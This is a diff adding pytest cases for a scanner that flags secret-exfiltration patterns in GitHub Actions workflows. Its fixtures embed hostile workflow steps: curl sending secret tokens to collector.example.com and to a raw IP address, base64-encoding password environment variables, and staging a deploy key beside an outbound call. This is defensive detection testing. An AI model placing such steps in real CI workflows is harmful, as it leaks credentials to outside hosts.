@@ -203,3 +203,197 @@ def test_cli_json_output(tmp_path):
     assert report["engine"] == "ghostaction-guard"
     assert report["campaign"]["name"] == "GhostAction"
     assert len(report["results"][0]["findings"]) >= 3
+
+
+# --- Dedicated per-rule fixtures: every GA-001..GA-008 gets its own --------
+# --- positive fixture plus rule-specific negatives. -------------------------
+
+GA001_DEDICATED_EVIL = """\
+name: Security Scan
+on: [push]
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "checking ${{ secrets.CI_TOKEN }} length"
+"""
+
+GA002_DEDICATED_EVIL = """\
+name: Deploy
+on: [push]
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -s -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" https://collector.example.com/submit
+"""
+
+GA004_DEDICATED_EVIL = """\
+name: Nightly Sync
+on: [push]
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          TOKEN=${{ secrets.SYNC_TOKEN }}
+          curl -s -X POST https://185.22.14.9/ingest -d "t=$TOKEN"
+"""
+
+GA005_DEDICATED_EVIL = """\
+name: Weekly Report
+on: [push]
+jobs:
+  report:
+    runs-on: ubuntu-latest
+    steps:
+      - run: env | grep -i password | base64 -w0 > /tmp/audit.txt
+"""
+
+GA005_BENIGN_BASE64 = """\
+name: Weekly Report
+on: [push]
+jobs:
+  report:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo build-done | base64 > /tmp/note.txt
+"""
+
+GA006_DEDICATED_EVIL = """\
+name: Security Audit
+on:
+  schedule:
+    - cron: '0 4 * * *'
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Collect diagnostics
+        run: echo "diag ${{ secrets.DEPLOY_KEY }}" > /tmp/diag
+      - name: Send heartbeat
+        run: curl -s https://heartbeat.example.com/ping
+"""
+
+GA006_NO_EGRESS = """\
+name: Security Audit
+on: [push]
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "diag ${{ secrets.DEPLOY_KEY }}" > /tmp/diag
+      - run: echo done
+"""
+
+GA003_PULL_REQUEST_NOT_TARGET = """\
+name: PR Build
+on: pull_request
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "using ${{ secrets.CI_TOKEN }}"
+"""
+
+GA007_BENIGN_GIT_LOG = """\
+name: Changelog
+on: [push]
+jobs:
+  log:
+    runs-on: ubuntu-latest
+    steps:
+      - run: git log --oneline | head -20
+"""
+
+GA008_STAGED_NEVER_SENT = """\
+name: Nightly
+on: [push]
+jobs:
+  n:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo ${{ secrets.K }} > /tmp/k
+      - run: echo done
+"""
+
+
+def test_ga001_deceptive_name_with_secret_touch_fires():
+    findings = scan.scan_text(GA001_DEDICATED_EVIL, "security-scan.yml")
+    assert ids(findings) == ["GA-001"]
+
+
+def test_ga002_secret_to_external_host_fires_critical():
+    findings = scan.scan_text(GA002_DEDICATED_EVIL, "deploy.yml")
+    assert ids(findings) == ["GA-002"]
+    assert findings[0]["severity"] == "CRITICAL"
+
+
+def test_ga004_obfuscated_endpoint_fires_high():
+    findings = scan.scan_text(GA004_DEDICATED_EVIL, "nightly-sync.yml")
+    found = ids(findings)
+    assert "GA-004" in found
+    ga004 = [f for f in findings if f["pattern_id"] == "GA-004"][0]
+    assert ga004["severity"] == "HIGH"
+    assert "IP literal" in ga004["detail"]
+
+
+def test_ga005_env_dump_encoded_fires():
+    findings = scan.scan_text(GA005_DEDICATED_EVIL, "weekly-report.yml")
+    assert ids(findings) == ["GA-005"]
+    assert findings[0]["severity"] == "HIGH"
+
+
+def test_ga005_benign_base64_stays_silent():
+    # base64 of non-secret content is not an env/secret dump.
+    assert scan.scan_text(GA005_BENIGN_BASE64, "weekly-report.yml") == []
+
+
+def test_ga006_split_step_exfil_fires():
+    findings = scan.scan_text(GA006_DEDICATED_EVIL, "security-audit.yml")
+    found = ids(findings)
+    # GA-001 co-fires by design: the deceptive filename is part of the
+    # GA-006 trigger. Nothing else may fire.
+    assert found == ["GA-001", "GA-006"], found
+    ga006 = [f for f in findings if f["pattern_id"] == "GA-006"][0]
+    assert ga006["severity"] == "HIGH"
+
+
+def test_ga006_needs_egress_in_other_step():
+    # Deceptive name + secret touch but no external call: GA-006 absent.
+    findings = scan.scan_text(GA006_NO_EGRESS, "security-audit.yml")
+    assert "GA-006" not in ids(findings)
+
+
+def test_ga003_needs_pull_request_target():
+    # pull_request (fork context) with secrets is not GA-003.
+    findings = scan.scan_text(GA003_PULL_REQUEST_NOT_TARGET, "pr-build.yml")
+    assert "GA-003" not in ids(findings)
+
+
+def test_ga007_needs_secret_shaped_grep():
+    # git log without secret-shaped token harvesting stays silent.
+    assert scan.scan_text(GA007_BENIGN_GIT_LOG, "changelog.yml") == []
+
+
+def test_ga008_needs_transmit_of_staged_file():
+    # Secret staged to a file that is never transmitted: GA-008 absent.
+    findings = scan.scan_text(GA008_STAGED_NEVER_SENT, "nightly.yml")
+    assert "GA-008" not in ids(findings)
+
+
+def test_all_eight_rules_have_dedicated_positive_coverage():
+    # Every GA-001..GA-008 must fire on at least one fixture in this file.
+    positives = {
+        "GA-001": (GA001_DEDICATED_EVIL, "security-scan.yml"),
+        "GA-002": (GA002_DEDICATED_EVIL, "deploy.yml"),
+        "GA-003": (PR_TARGET_EVIL, "pr-check.yml"),
+        "GA-004": (GA004_DEDICATED_EVIL, "nightly-sync.yml"),
+        "GA-005": (GA005_DEDICATED_EVIL, "weekly-report.yml"),
+        "GA-006": (GA006_DEDICATED_EVIL, "security-audit.yml"),
+        "GA-007": (GIT_HISTORY_MINING, "hygiene.yml"),
+        "GA-008": (SPLIT_STEP_EVIL, "ci.yml"),
+    }
+    for pid, (text, label) in positives.items():
+        found = ids(scan.scan_text(text, label))
+        assert pid in found, "%s not fired by its fixture (got %s)" % (pid, found)
